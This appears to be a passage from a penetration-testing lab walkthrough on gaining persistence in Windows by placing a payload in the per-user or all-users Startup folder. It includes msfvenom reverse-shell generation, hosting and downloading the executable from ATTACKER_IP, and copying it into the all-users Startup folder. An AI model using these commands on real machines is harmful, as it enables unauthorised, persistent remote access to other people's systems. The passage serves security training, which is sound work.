Each user has a folder under
`C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. Notice that each user will only run whatever is available in their folder.

If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` in the same way.

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```

```shell-session
user@AttackBox$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
```

```shell-session
PS C:\> wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
```

We then store the payload into the `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` folder to get a shell back for any user logging into the machine.
```shell-session
C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open):
